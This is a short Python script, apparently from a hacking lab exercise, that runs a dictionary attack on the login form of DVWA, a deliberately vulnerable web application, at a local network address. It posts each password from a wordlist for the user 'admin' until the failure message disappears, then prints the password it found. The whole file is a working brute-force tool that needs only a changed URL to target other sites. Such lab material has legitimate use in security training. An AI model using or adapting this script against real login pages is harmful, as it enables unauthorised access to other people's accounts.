#!/usr/bin/env python

import requests, sys

target_url = "http://192.168.0.100/dvwa/login.php"
form_data = {"username": "admin", "password": "", "Login": "submit"}

password_list = open("passwords-small.txt", "r")
for password in password_list:
    password = password.rstrip()
    form_data["password"] = password
    response = requests.post(target_url, data=form_data)
    if "Login failed" not in response.content:
        print("[+] Got the password --> " + password)
        password_list.close()
        sys.exit()

print("[+] Reached the end of line.")
